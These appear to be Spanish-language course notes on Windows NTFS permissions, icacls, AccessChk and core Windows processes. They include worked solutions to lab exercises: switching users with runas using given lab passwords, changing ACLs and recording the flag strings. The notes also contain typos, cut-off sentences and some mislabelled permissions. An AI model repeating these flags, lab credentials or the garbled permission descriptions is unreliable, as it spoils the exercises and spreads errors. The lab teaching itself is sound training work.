En esta sección, comenzaremos a explorar la New Technolofy File System (NTFS) de Windows. Tenga en cuenta que este tema es muy amplio y solo podremos cubrir los permisos básicos. Lo importante es que queremos ser capaces de identificar y comprender los diversos permisos para que eventualmente podamos aprender a explotar cualquier problema en el futuro.

Al igual que los permisos basados ​​en Unix, NTFS trata los archivos y directorios de forma ligeramente diferente. Aprendamos sobre ellos uno a la vez. El siguiente es el conjunto básico de permisos que se pueden asignar a los *ficheros* (files).

- *Read*: permite al usuario ver el contenido del archivo. También permite a los usuarios ejecutar scripts (que no archivos binarios).

- *Write*: permite al usuario escribir en el archivo. Tenga en cuenta que no permite que un usuario elimine el archivo, aunque puede eliminar su contenido.

- *Read & Execute*: permite al usuario leer el archivo, así como ejecutar scripts y además archivos binarios.

- *Modify*: permite al usuario tanto leer como escribir en el archivo. También permite al usuario eliminarlo.

- *Full Control*: permite al usuario leer, escribir, cambiar o eliminar el archivo.

Aquí está el conjunto básico de permisos asignables a los *directorios* (directory), debemos tener en cuenta que los permisos sobre el directorio no .

- *Read*: permite al usuario listar cualquier archivo en el directorio y ver sus contenidos.

- *Write*: permite al usuario agregar archivos o subcarpetas al directorio.

- *Read & Write*: permite al usuario enumerar cualquier archivo o subcarpeta en el directorio y ver el contenido de los ficheros, y también permite la ejecución de cualquier binario dentro de la carpeta.

- *List Folder Contents*: permite al usuario enumerar cualquier archivo o subcarpeta en el directorio y también permite la ejecución de cualquier archivo binario dentro de la carpeta. *List Folder Contents* parece a primera vista muy similar a *Read & Write*, la diferencia entre ellos es que Read & Execute también permite ver el contenido de los archivos.

- *Modify*: permite al usuario leer, escribir y eliminar archivos y subcarpetas dentro del directorio.

- *Full Control*: permite al usuario leer, escribir, cambiar y eliminar archivos y subcarpetas dentro del directorio. Tenga en cuenta que el permiso *Full Control* en un directorio le permite al usuario eliminar todos los archivos que contiene, incluso si no tiene asignados permisos de Modify o Full Control en los propios archivos.

Hay que tener en cuenta que los permisos de 
Estos permisos básicos se componen de un conjunto mayor de *special permissions*. Estos permisos especiales permiten un control más granular sobre lo que pueden hacer los usuarios. Podemos pensar en los permisos especiales como bloques de construcción que conforman los básicos, donde los básicos son solo las combinaciones más utilizadas. 

Un concepto importante para cubrir rápidamente es el de la *herencia*. En general, en Windows distinguimos dos tipos de permisos, los permisos Explicitos y los permisos Heredados. Estos últimos son aquellos permisos que se propagan desde un objeto o *entidad padre* (parent entity) hacia sus hijos (children). En el caso de NTFS, la herencia tiene que ver con los permisos asignados a un archivo o carpeta en particular. De forma predeterminada, *un archivo o carpeta en particular hereda los permisos de la carpeta en la que se crea*. 

Esto significa por ejemplo que un fihceor que se crea sobre un directorio con frecuencia hereda los accesos y permisos del directorio. Sin embargo, esto no significa que podamos encontrar ficheros con permisos peculiares dentro de directorios como veremos en los ejercicio a continuación.

<br />

- *icacls*

Pasemos ahora a algunas de las formas en que podemos ver e interactuar con los permisos en un sistema Windows. La herramienta _icacls_ y su predecesor obsoleto, *cacls*, son ejecutables integrados (built-in binary) que pueden mostrar y modificar permisos en archivos y carpetas.

Podemos ver la información de uso de icacls escribiéndola en el símbolo del sistema.

```
C:\>icacls

ICACLS name /save aclfile [/T] [/C] [/L] [/Q]
    stores the DACLs for the files and folders that match the name
    into aclfile for later use with /restore. Note that SACLs,
    owner, or integrity labels are not saved.

ICACLS directory [/substitute SidOld SidNew [...]] /restore aclfile
                 [/C] [/L] [/Q]
    applies the stored DACLs to files in directory.
...
```

Hacia la parte inferior de la extensa información de uso, podemos ver que los diversos derechos o permisoso están codificados con uno a cuatro caracteres:

```
    perm is a permission mask and can be specified in one of two forms:
        a sequence of simple rights:
                N - no access
                F - full access
                M - modify access
                RX - read and execute access
                R - read-only access
                W - write-only access
                D - delete access
        a comma-separated list in parentheses of specific rights:
                DE - delete
                RC - read control
                WDAC - write DAC
                WO - write owner
                S - synchronize
                AS - access system security
                MA - maximum allowed
                GR - generic read
                GW - generic write
                GE - generic execute
                GA - generic all
                RD - read data/list directory
                WD - write data/add file
                AD - append data/add subdirectory
                REA - read extended attributes
                WEA - write extended attributes
                X - execute/traverse
                DC - delete child
                RA - read attributes
                WA - write attributes
        inheritance rights may precede either form and are applied
        only to directories:
                (OI) - object inherit
                (CI) - container inherit
                (IO) - inherit only
                (NP) - don't propagate inherit
                (I) - permission inherited from parent container
```

Estas son algunas de las opciones comunes que podrían interesarnos:

- **/T** ejecuta la operación recursivamente en todas las subcarpetas
   
- **/C** obliga a que la operación continúe a pesar de los errores

- **/L** se usa con enlaces simbólicos. Hace que la operación se ejecute en el propio enlace en lugar de en su destino.

Podemos proporcionar una carpeta como entrada a icacls para ver sus permisos.

```
C:\Users\Offsec>icacls Music
Music NT AUTHORITY\SYSTEM:(OI)(CI)(F)
      BUILTIN\Administrators:(OI)(CI)(F)
      Offsec-Machine\Offsec:(OI)(CI)(F)

Successfully processed 1 files; Failed processing 0 files
```

Anteriormente, comenzamos a aprender sobre ACE y ACL. Una ACE representa un permiso particular y una ACL es solo una lista de los permisos. En el ejemplo anterior, cada línea de la salida se considera un ACE. Los valores entre paréntesis indican las propiedades de herencia y los derechos del usuario dado. Por ejemplo, "(OI)" significa Object Inherit, lo que significa que el ACE será heredado por archivos y carpetas ubicados dentro del directorio. En este caso, los tres usuarios de la máquina tienen acceso completo al archivo debido al indicador "F".

Podemos usar las opciones /grant y /deny para otorgar o quitar derechos a un archivo o carpeta.

```
c:\>icacls Music /grant Susan:(OI)(CI)(F)
processed file: Folder
Successfully processed 1 files; Failed processing 0 files

c:>icacls Music /t /c
Music NT AUTHORITY\SYSTEM:(OI)(CI)(F)
      BUILTIN\Administrators:(OI)(CI)(F)
      Offsec-Machine\Offsec:(OI)(CI)(F)
      Offsec-Machine\Susan:(OI)(CI)(F)

Music\RockAndRoll NT AUTHORITY\SYSTEM:(OI)(CI)(F)
                  BUILTIN\Administrators:(OI)(CI)(F)
                  Offsec-Machine\Offsec:(OI)(CI)(F)
                  Offsec-Machine\Susan:(OI)(CI)(F)
...
```

En el ejemplo anterior, le otorgamos al usuario *Susan* permisos completos para el directorio Música . Luego usamos la opción /t para verificar que los permisos asignados se hayan propagado a los elementos secundarios del directorio.

Uno de los muchos programas incluidos en la suite Sysinternals se llama accesschk.exe, o simplemente *AccessChk*. AccessChk es una sólida herramienta de auditoría que puede recuperar información sobre permisos en todo el sistema operativo.

Revisemos la información de uso de AccessChk invocándola en la línea de comando. Tenga en cuenta que debemos proporcionar la ruta completa al archivo o ejecutarlo desde el directorio que contiene Sysinternals.

```
C:\Users\Offsec\Downloads\SysinternalsSuite>accesschk

Accesschk v6.13 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com

usage: accesschk [-s][-e][-u][-r][-w][-n][-v]-[f <account>,...][[-a]|[-k]|[-m]|[-p [-f] [-t]]|[-h][-o [-t <object type>]][-c]|[-d]] [[[-l|-L] [-i]]|[username]] <file, directory, event log, registry key, process, service, object>
   -a     Name is a Windows account right. Specify '*' as the name to show all
          rights assigned to a user. Note that when you specify a specific
          right, only groups and accounts directly assigned the right are
          displayed.
   -c     Name is a Windows Service e.g. ssdpsrv. Specify '*' as the
          name to show all services and 'scmanager' to check the security
          of the Service Control Manager.
   -d     Only process directories or top level key.
   -e     Only show explicitly set Integrity Levels (Windows Vista and
          higher only).
   -f     If following -p, shows full process token information including
          groups and privileges. Otherwise is a list of comma-separated
          accounts to filter from the output.
   -h     Name is a file or printer share. Specify '*' as the name to show
          all shares.
   -i     Ignore objects with only inherited ACEs when dumping full access
          control lists.
   -k     Name is a Registry key e.g. hklm\software
   -l     Show full security descriptor. Add -i to ignore inherited ACEs.
          Specify upper-case L to have the output format as SDDL.
   -m     Name is an event log (specify '*' as the name to show all event logs.
   -n     Show only objects that have no access.
   -o     Name is an object in the Object Manager namespace (default is root).
          To view the contents of a directory, specify the name with a trailing
          backslash or add -s. Add -t and an object type (e.g. section) to
          see only objects of a specific type.
   -p     Name is a process name or PID e.g. cmd.exe (specify '*' as the
          name to show all processes). Add -f to show full process
          token information including groups and privileges. Add -t to show
          threads.
   -nobanner
          Do not display the startup banner and copyright message.
   -r     Show only objects that have read access.
   -s     Recurse.
   -t     Object type filter e.g. "section"
   -u     Suppress errors.
   -v     Verbose (includes Windows Vista Integrity Level).
   -w     Show only objects that have write access.

If you specify a user or group name and path AccessChk will report the
effective permissions for that account; otherwise it will show the effective
access for accounts referenced in the security descriptor.

By default the path name is interpreted as a file system path (use the
"\pipe\" prefix to specify a named pipe path). For each object AccessChk
prints R if the account has read access, W for write access and nothing if
it has neither. The -v switch has AccessChk dump the specific
accesses granted to an account.
```

Podemos ver los derechos de un principal de seguridad específico al proporcionarlo como entrada a AccesssChk. Veamos qué tipo de permisos tiene el grupo *users* en la unidad C:\\:

```
c:\Users\Offsec\Desktop\SysinternalsSuite>accesschk.exe "users" c:\

Accesschk v6.13 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com

RW c:\$Recycle.Bin
R  c:\$WINDOWS.~BT
R  c:\bootmgr
R  c:\BOOTNXT
R  c:\Documents and Settings
   c:\MSOCache
c:\pagefile.sys
  Error getting security:
  The process cannot access the file because it is being used by another process.
   c:\PerfLogs
R  c:\Program Files
R  c:\Program Files (x86)
RW c:\ProgramData
R  c:\Python27
R  c:\Recovery
c:\swapfile.sys
  Error getting security:
  The process cannot access the file because it is being used by another process.
   c:\System Volume Information
R  c:\Users
R  c:\Windows
```

El resultado del ejemplo anterior muestra los permisos para el principal proporcionado a AccessChk como entrada (en este caso, el grupo de usuarios). Muestra una "R" si el principal tiene permisos de lectura, una "W" si el principal tiene permisos de escritura y nada si no tiene ninguno.

Recuerde que las *runas* se pueden usar para ejecutar un archivo con los permisos de otra persona.

<br />

**Exercises 5.3.1**

Utilice el comando: 

```
rdesktop -u Offsec -p Offsec <target_IP>
```

En Kali Linux para acceder a la VM de Windows de destino. Todos los usuarios de la máquina aparte de "Offsec" tienen la contraseña "color". Usa lo que sabes sobre los permisos de Windows para resolver los siguientes ejercicios. Los archivos para estos ejercicios se pueden encontrar en C:\\Users\\Offsec\\Desktop\\Colors.

**1. ¿Qué permiso de archivo permite leer y escribir el archivo y también permite eliminarlo?**

Modify

<br />

**2. ¿Qué permiso de carpeta permite leer, escribir, cambiar y eliminar archivos en una carpeta y sus subcarpetas?**

Full Control

<br />

**3. ¿Cuál es la abreviatura de icacls que significa que los archivos creados dentro de esta carpeta heredarán este ACE?**

OI

<br />

**4. Verdadero o falso: solo necesita permisos de lectura en un script para ejecutarlo.**

True

<br />

**5. ¿Cuál es la bandera contenida en colorbook.txt?**

En primer lugar acudimos al fichero C:\\Users\\Offsec\\Desktop\\Colors y exploramos los permisos que tenemos sobre esa carpeta:

```cmd
C:\Users\Offsec\Desktop\Colors>icacls .\
.\ BUILTIN\Users:(R,W)
   NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
   BUILTIN\Administrators:(I)(OI)(CI)(F)
   WINDOWS-02\Offsec:(I)(OI)(CI)(F)
```

En principio nuestro usuario tiene control total de la carpeta y eso en principio según sabemos nos da permisos de escritura y modificación sobre los ficheros dentro del directorio. Sin embargo cuando intentamos leer el fichero obtenemos un Access Denied.

```cmd
C:\Users\Offsec\Desktop\Colors>type colorbook.txt
Access is denied.
```

Así comprobamos los permisos del fichero 

```cmd
C:\Users\Offsec\Desktop\Colors>icacls colorbook.txt
colorbook.txt BUILTIN\Users:(Rc,S,REA,RA)
              WINDOWS-02\Administrator:(F)
              WINDOWS-02\purple:(R)
```

No tenemos acceso a él sin embargo, el usuario 'purple' si, de esta forma, ejecutamos el siguiente comando:

```cmd
C:\Users\Offsec\Desktop\Colors>runas /user:purple cmd
```

Esto abrirá una nueva sesión de cmd propiedad del usuario purple. 

```cmd
C:\WINDOWS\system32>whoami
windows-02\purple
```

Así, leemos desde este usuario el fichero deseado:

```cmd
C:\WINDOWS\system32>type C:\Users\Offsec\Desktop\Colors\colorbook.txt
OS{coloring-is-a-blast}
```

<br />

**6. ¿Cuál es la bandera contenida en rainbow.txt?**

A igual que en el caso anterior intentamos acceder al fichero pero observamos que no tenemos acceso al fichero:

```cmd
C:\Users\Offsec\Desktop\Colors>type rainbow.txt
Access is denied.
```

Exploramos los permisos del fichero. Vemos que, aunque no hay un usuario especificado, si que hay un grupo especificado de forma que utilizamos net para ver qué usuarios están dentro del grupo SubtractivePrimaries:

```cmd
C:\Users\Offsec\Desktop\Colors>icacls rainbow.txt
rainbow.txt BUILTIN\Users:(Rc,S,REA,RA)
            WINDOWS-02\Administrator:(F)
            WINDOWS-02\SubtractivePrimaries:(R)

Successfully processed 1 files; Failed processing 0 files

C:\Users\Offsec\Desktop\Colors>net localgroup SubtractivePrimaries
Alias name     SubtractivePrimaries
Commen

Members

-------------------------------------------------------------------------------
magenta
teal
yellow
The command completed successfully.
```

Así utilizamos 'runas' como en el ejemplo anterior para ejecutar abrir otra cmd como yellow y leer el contenido del flag:

```cmd
C:\Users\Offsec\Desktop\Colors>runas /user:yellow cmd
Enter the password for yellow:
Attempting to start cmd as user "WINDOWS-02\yellow" ...
```

<br />

```cmd
Microsoft Windows [Version 10.0.19042.1052]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>type C:\Users\Offsec\Desktop\Colors\rainbow.txt
OS{indigo-is-missing?!}
```

<br />

**7. ¿Cuál es la bandera contenida en el ejecutable wavelengths.exe?**

Intentamos ejecutar el binario con nuestro usuario:

```cmd
C:\>C:\Users\Offsec\Desktop\Colors\wavelengths.exe
Access is denied.

C:\>icacls C:\Users\Offsec\Desktop\Colors\wavelengths.exe
C:\Users\Offsec\Desktop\Colors\wavelengths.exe BUILTIN\Users:(Rc,S,REA,RA)
                                               WINDOWS-02\Administrator:(F)
                                               WINDOWS-02\red:(RX)
```

Exploramos los permisos y vemos que el usuario 'red' tiene permisos de ejecución, con lo que cambiamos con runas:

```cmd
runas /user:red cmd
```

Y seguidamente ejecutamos el binario:

```cmd
C:\WINDOWS\system32>C:\Users\Offsec\Desktop\Colors\wavelengths.exe
Nicely done! Your flag is:
OS{380-to-750}
```

<br />

**8. Cambia el contenido del fichero 'spectrum.txt' a 'flag' y de ahí ejecuta el binario 'spectrum.exe' para obtener el flag.**

Como en ejemplos anteriores tratamos de efectuar la operación con nuestro usuario pero no tenemos éxito.

```cmd
C:\>echo "flag" > C:\Users\Offsec\Desktop\Colors\spectrum.txt
Access is denied.
```

De esta forma, exploramos los permisos del fichero:

```cmd
C:\>icacls C:\Users\Offsec\Desktop\Colors\spectrum.txt
C:\Users\Offsec\Desktop\Colors\spectrum.txt BUILTIN\Users:(R)
                                            WINDOWS-02\Administrator:(F)
                                            WINDOWS-02\teal:(W)

Successfully processed 1 files; Failed processing 0 files
```

Observamos que el usuario 'teal' tiene permisos de escritura sobre el fichero. Así, utilizamos el comando runas para abrir una nueva sesión y escribir el contenido:

```cmd
C:\>runas /user:teal cmd
Enter the password for teal:
Attempting to start cmd as user "WINDOWS-02\teal" ...
```

<br />

```cmd
Microsoft Windows [Version 10.0.19042.1052]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>echo "flag" > C:\Users\Offsec\Desktop\Colors\spectrum.txt
```

Sin embargo al tratar de explorar el contenido del fichero observamos que hemos copiado mal el contenido porque el comando 'echo' se lleva las comillas. Copiamos bien el contenido utilizando 'echo' sin las comillas:

```cmd
C:\WINDOWS\system32>echo flag > C:\Users\Offsec\Desktop\Colors\spectrum.txt
```

Y recuperamos la flag con el usuario Offsec:

```cmd
C:\>C:\Users\Offsec\Desktop\Colors\spectrum.exe
Great! Your flag is:
OS{can-you-see-visible-light-at-night?}
```

<br />

**9. Crea un fichero llamado photons.txt in el directorio Particles. Seguidamente ejecuta el binario particles.exe para obtener la flag**

Acudimos con nuestro usuario al fichero Particles dentro de Desktop\\Colors. Obviamente, no tenemos permisos para crear un fichero dentro del directorio con lo que exploramos sus permisos:

```cmd
C:\Users\Offsec\Desktop\Colors>icacls Particles
Particles BUILTIN\Users:(Rc,S,REA,RA)
          WINDOWS-02\Administrator:(F)
          WINDOWS-02\WarmColors:(S,RD)
          WINDOWS-02\CoolColors:(S,WD)
```

Observamos que al margen de los permisos por defecto existen dos grupos que tienen un conjunto de permisos distintos. A nosotros obviamente nos interesa el grupo 'CoolColors' que posee permisos 'WD' (Write Data /Add Data), el otro tendría 'RD' (Read Data).

Así, exploramos con net este grupo para ver si algún usuario a nuestro alcance forma parte de nuestro grupo:

```cmd
C:\Users\Offsec\Desktop\Colors>net localgroup CoolColors
Alias name     CoolColors
Commen

Members

-------------------------------------------------------------------------------
blue
green
purple
teal
The command completed successfully.
```

Así, observamos que el usuario 'purple' tiene los permisos que nosotros necesitamos con lo que acedemos a una cmd suya con 'runas' como hemos hecho en los ejemplos anteriores. 

```cmd
runas /user:purple cmd
```

Seguidamente, creamos el fichero en el directorio redireccionando el error de un comando sin errores: 

```cmd
echo "" 2> C:\Users\Offsec\Desktop\Colors\Particles\photons.txt
```

Como se hace un redireccionamiento vacío ya que el comando non produce ningún error se crea un fichero sin contenido.

Ahora queremos verificar que el contenido se ha creado y que no tienen contenido. No podemos hacerlo con nuestro usuario debido al hecho de que no tenemos permisos de lectura sobre el directorio. Así, exploramos los permisos del grupo WarmColors:

```cmd
C:\Users\Offsec\Desktop\Colors>net localgroup WarmCOlors
Alias name     WarmCOlors
Commen

Members

-------------------------------------------------------------------------------
burgundy
orange
pink
red
yellow
The command completed successfully.
```

<br />

De esta forma, por ejemplo el usuario 'red' puede listar y ver los contenidos del directorio Particles. Así, con runas abrimos una cmd como dicho usuario y exploramos que los contenidos sean correctos:

```
C:\WINDOWS\system32>dir C:\Users\Offsec\Desktop\Colors\Particles
 Volume in drive C has no label.
 Volume Serial Number is 7ADD-E6C8

 Directory of C:\Users\Offsec\Desktop\Colors\Particles

01/24/2023  10:34 AM    <DIR>          .
01/24/2023  10:34 AM    <DIR>          ..
06/30/2021  01:20 PM                 8 bosons.txt
01/24/2023  10:34 AM                 0 photons.txt
               2 File(s)              8 bytes
               2 Dir(s)  10,339,037,184 bytes free

C:\WINDOWS\system32>type C:\Users\Offsec\Desktop\Colors\Particles\photons.txt
```

Así, comprobamos que efectivamente está el fichero 'photons.txt' y que este pesa 0, para mayor seguridad, vemos el contenido y observamos que está vacío.

Así, sólo queda ejecutar el binario 'particles.exe' sin emabrgo no tenemos permisos para ello, con lo que de nuevo con el usuario Offsec observamos cuáles son los permisos sobre el ejecutable y vemos que el usuario Pink tiene permisos de ejecución:

```
C:\Users\Offsec\Desktop\Colors>particles.exe
Access is denied.

C:\Users\Offsec\Desktop\Colors>icacls particles.exe
particles.exe BUILTIN\Users:(Rc,S,REA,RA)
              WINDOWS-02\Administrator:(F)
              WINDOWS-02\pink:(RX)
```

Así, desplegamos una cmd como pink con runas y ejecutamos el binario:

```cmd
C:\WINDOWS\system32>C:\Users\Offsec\Desktop\Colors\particles.exe
W00T! Your flag is:
OS{photons-are-their-own-anti-particle}
```

<br />

**11. Actualiza el fichero *lazerbeams.txt* de forma que Red tenga control total, WarmColors haya leido y ejecutado permisos y todo el mundo pueda sólo leer. Entonces ejecuta 'saturation.exe' para obtener el flag.**

Acudimos al fichero y leemos sus permisos:

```cmd
C:\Users\Offsec\Desktop\Colors>icacls lazerbeams.txt
lazerbeams.txt BUILTIN\Users:(Rc,S,REA,RA)
               WINDOWS-02\red:(WDAC,S)
```

Podemos observar que el usuario 'red' puede sobreescribir el DAC del fichero, esto es, los permisos. De forma que con runas abrimos una shell como 'red' y modificamos los permisos a través de la utilidad 'icacls'. 


```
Microsoft Windows [Version 10.0.19042.1052]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>icacls C:\Users\Offsec\Desktop\Colors\lazerbeams.txt
C:\Users\Offsec\Desktop\Colors\lazerbeams.txt BUILTIN\Users:(Rc,S,REA,RA)
                                              WINDOWS-02\red:(WDAC,S)

Successfully processed 1 files; Failed processing 0 files

C:\WINDOWS\system32>icacls C:\Users\Offsec\Desktop\Colors\lazerbeams.txt /grant Everyone:(R)
processed file: C:\Users\Offsec\Desktop\Colors\lazerbeams.txt
Successfully processed 1 files; Failed processing 0 files

C:\WINDOWS\system32>icacls C:\Users\Offsec\Desktop\Colors\lazerbeams.txt /grant red:(F)
processed file: C:\Users\Offsec\Desktop\Colors\lazerbeams.txt
Successfully processed 1 files; Failed processing 0 files

C:\WINDOWS\system32>icacls C:\Users\Offsec\Desktop\Colors\lazerbeams.txt
C:\Users\Offsec\Desktop\Colors\lazerbeams.txt Everyone:(R)
                                              BUILTIN\Users:(Rc,S,REA,RA)
                                              WINDOWS-02\red:(F)

Successfully processed 1 files; Failed processing 0 files

C:\WINDOWS\system32>icacls C:\Users\Offsec\Desktop\Colors\lazerbeams.txt WarmColors:(RX)
Invalid parameter "WarmColors:(RX)"

C:\WINDOWS\system32>icacls C:\Users\Offsec\Desktop\Colors\lazerbeams.txt /grant WarmColors:(RX)
processed file: C:\Users\Offsec\Desktop\Colors\lazerbeams.txt
Successfully processed 1 files; Failed processing 0 files

C:\WINDOWS\system32>icacls C:\Users\Offsec\Desktop\Colors\lazerbeams.txt
C:\Users\Offsec\Desktop\Colors\lazerbeams.txt WINDOWS-02\WarmColors:(RX)
                                              Everyone:(R)
                                              BUILTIN\Users:(Rc,S,REA,RA)
                                              WINDOWS-02\red:(F)
```

Despúes con el usuario Offsec ejecutamos el binario y obtenemos la flag.

```cmd
C:\Users\Offsec\Desktop\Colors>saturation.exe
Access Granted! Your flag is:
OS{hue-and-saturation-and-brightness-ohmy!}
```

<br />

**12 Actualiza el directorio Chromacity de forma que Everyone puede listar su contenido y que esté sincronizado. Configura el grupo AdditivePrimaries para que tenga sólo permisos de lectura y para que el usuario Orange pueda modificar. Entonces, ejecuta 'undertones.exe' para obtener el flag.**

Acudimos al directorio y exploramos sus permisos 

```
C:\WINDOWS\system32>icacls C:\Users\Offsec\Desktop\Colors\Chromacity
C:\Users\Offsec\Desktop\Colors\Chromacity BUILTIN\Users:(Rc,S,REA,RA)
                                          WINDOWS-02\blue:(WDAC,S)
```

Así, como blue puede cambiar los permisos DAC (WDAC) iniciamos una cmd con runas como blue e introducimos los siguientes comandos:

```cmd
Microsoft Windows [Version 10.0.19042.1052]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>icacls C:\Users\Offsec\Desktop\Colors\Chromacity
C:\Users\Offsec\Desktop\Colors\Chromacity BUILTIN\Users:(Rc,S,REA,RA)
                                          WINDOWS-02\blue:(WDAC,S)

Successfully processed 1 files; Failed processing 0 files

C:\WINDOWS\system32>icacls C:\Users\Offsec\Desktop\Colors\Chromacity /grant Everyone:(RD)
processed file: C:\Users\Offsec\Desktop\Colors\Chromacity
Successfully processed 1 files; Failed processing 0 files

C:\WINDOWS\system32>icacls C:\Users\Offsec\Desktop\Colors\Chromacity /grant Everyone:(S)
processed file: C:\Users\Offsec\Desktop\Colors\Chromacity
Successfully processed 1 files; Failed processing 0 files

C:\WINDOWS\system32>icacls C:\Users\Offsec\Desktop\Colors\Chromacity /grant AdditivePrimaries:(R)
processed file: C:\Users\Offsec\Desktop\Colors\Chromacity
Successfully processed 1 files; Failed processing 0 files

C:\WINDOWS\system32>icacls C:\Users\Offsec\Desktop\Colors\Chromacity /grant Orange:(M)
processed file: C:\Users\Offsec\Desktop\Colors\Chromacity
Successfully processed 1 files; Failed processing 0 files
```

<br />

```
C:\Users\Offsec\Desktop\Colors>undertones.exe
Access Granted! Your flag is:
OS{tones-and-shades-and-tints-so-much-vocabulary!}
```


#### 1.9. Windows Processes.

**Definición. Procesos & Threads.**

En esta sección vamos a cubrir lo que son los procesos de Windows (Windows Processes).

Empezaremos a través de la definición, un *proceso* es la instancia de un programa en ejecución, es decir, existe una plantilla que el sistema utiliza para ejecutar un programa. Esta plantilla es algo así como un objeto definido a través de una serie de características que toman un valor concreto (se instancian) dependiendo del programa que se ejecuta.

En Windows, cada proceso se instancia a partir de un ejecutable '.exe', de forma que es totalmente válido identificar un proceso en Windows con el ejecutable a partir del cual se instancia, este nombre es el *Image Name* del proceso.

A su vez, los procesos se gestionan a través de la división de estos en unidades de gestion conocidas como *threads*, las cuales se definen como la unidad de secuencias de instrucciones más pequeñas que el sistema operativo puede gestionar.

<br />

**Kernel mode & User mode.**

En general, una computadora alternará entre estos dos modos para ejecutar muchas tareas diferentes en períodos cortos. 

- El modo kernel es para las operaciones más confiables que el propio sistema operativo debe ejecutar. Los procesos que se ejecutan en modo Kernel tienen acceso al hardware subyacente de la máquina física.

- Por otro lado, el modo Usuario es para la gran mayoría de los programas que se ejecutan en la computadora, pero los procesos que se ejecutan en modo Usuario no tienen acceso al hardware de la máquina.

De esta forma, aunque distinguimos en esencia dos tipos de procesos en función del modo en el que se ejecutan en el sistema operativo, nosotros nos centraremos en los procesos que se ejecutan en modo usuario que son por otra parte los más frecuentes

<br />

**Herencia entre procesos**

Ya hemos utilizado el témino 'herencia' para describir una característica por la cual ficheros o directorios adquieren los permisos del directorio en el que se encuentran (Inherited Permissions), su 'Parent Folder'.


Referido a los procesos el concepto es parecido. La idea fundamental es que un proceso puede inicializar otro proceso, decimos entonces que el Proceso1 es un 'parent object' del Proceso2 y este último heredara los permisos del primero.

Para ser considerado padre/hijo, el respectivo proceso hijo/padre aún debe estar activo. En otras palabras, la herencia en este contexto describe una *relación*: tanto el padre como el hijo deben estar en ejecución para mantener el estado de su relación.

<br />

**Procesos Importantes**

Ahora vamos a presentar un conjunto de procesos que parten de una serie de ejecutables que son vitales para el correcto inicio y funcionamiento de Windows.

- **System**: Este es un proceso que se ejecuta en 'kernel-mode' (el único que veremos) que opera sobre los mecanismos de funcionamiento del kernel del systema operativo Windows. Entre otras cosas, se asegura de que el sistema operativo pueda comunicarse correctamente con el hardware de la máquina e iniciar otros procesos en 'user-mode'. Además, inicia el proceso 'smss.exe', se dice que lo 'spawnea' y por tanto es su *process parent*. Tiene PID 4. 

- **smss.exe**: *smss* o *Session Manager* es el primer proceso que se ejecuta en el OS bajo 'user-mode' y es responsable de mapear direcciones de memoria virtuales Es importante resaltar que el proceso *System* lo spawnea dos veces. La primera instancia spawnea *winlogon.exe* y *csrss.exe* y se termina. La otra instancia se mantiene activa para vigilar la sesión del usuario para por ejemplo indicar la detención o el bloqueo del sistema si nota algún problema con *winlogon.exe* o *csrss.exe*.

- **winlogon.exe**: Este proceso es responsable de la autenticación de usuarios y de cargar perfiles de usuario. Es importante notar que Winlogon.exe no tiene un 'parent process' debido a que el proceso que lo spawnea (smss.exe) se cierra inmediantamente después. Winlogon además spawnea el proceso 'userinit.exe' que ejecuta la shell inicial del usuario (Windows GUI shell) y 'explore.exe' seguidamente se cierrra.

- **csrss.exe**: Abreviatura de *Client Server Runtime Process* es responsable de varias funciones gestionadas en segundo plano. Inicia la secuencia de apagado del sistema e inicia el proceso que spawnwa el 'cmd.exe'.

- **explorer.exe**: Este proceso es responsable de renderizar parte de la shell GUI de Windows con el que el usuario interactúa. Es el padre de otros muchos procesos pero no tiene pariente debudo a que Winlogon se cierra nada más spawnear dichos procesos.

- **wininit.exe**: Este proceso es responsable de activar un conjunto crucial de aplicaciones en 'user-mode' que deben ejecutarse para mantener la estabilidad y la funcionalidad del sistema. El inicio de Windows es el padre de varios procesos secundarios.

<br />

**Tasklist, Taskkill**

Ahora que hemos vistos algunos de los procesos más importantes de Windows veámos algunas herramientas con las que podemos interactuar con estos procesos:

- *Tasklist*

El comando tasklist enumerará todos los procesos en ejecución y actualmente suspendidos en la máquina:

```
C:\>tasklist

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0 Services                   0          8 K
System                           4 Services                   0        136 K
Registry                       124 Services                   0     34,532 K
smss.exe                       428 Services                   0      1,200 K
csrss.exe                      628 Services                   0      5,576 K
wininit.exe                    780 Services                   0      7,032 K
csrss.exe                      788 Console                    1      5,440 K
winlogon.exe                   888 Console                    1     12,120 K
services.exe                   948 Services                   0     10,264 K
lsass.exe                      968 Services                   0     22,064 K
svchost.exe                    668 Services                   0     28,920 K
...
```

Podemos ver cosas que hemos dado ya, como por ejemplo que el PID de System siempre es 4 tal y como hemos dicho.

Una opción importante en *tasklist* es '/FI' que nos permite parsear los resultados basados en input adicional:

```
C:\>tasklist /?

[...]

 /FI    filter  Displays a set of tasks that match a given criteria specified by the filter.

[...]
```

Por ejemplo, podemos desplegar un comando para filtrar aquellos servicios ejecutados por System que se mantengan en ejecución:

```
C:\>tasklist /fi "USERNAME eq NT AUTHORITY\SYSTEM" /fi "STATUS eq running"

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
csrss.exe                      788 Console                    1      5,448 K
NVDisplay.Container.exe       2892 Console                    1     46,768 K
rundll32.exe                  5388 Console                    1      7,280 K
...
```

Además tenemos el comando 'find' que podemos utilizar para filtrar patrones tipo 'string' en el output de otro comando con el 'pipe':

```
C:\>tasklist /fi "imagename eq cmd.exe"

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
cmd.exe                         84 Console                    1      4,408 K

C:\>tasklist |find "cmd.exe"
cmd.exe 
```

<br />

- *taskkill*

Podemos emplear el comando *taskkill* para terminato procesos especificando su PID o el nombre del ejecutable del que parte el proceso (Image name).

```
C:\>taskkill /PID 84
```

Podemos desplegar la ayuda para más información.

```
C:\>taskkill /?

TASKKILL [/S system [/U username [/P [password]]]]
         { [/FI filter] [/PID processid | /IM imagename] } [/T] [/F]

Description:
    This tool is used to terminate tasks by process id (PID) or image name.

Parameter List:
    /S    system           Specifies the remote system to connect to.

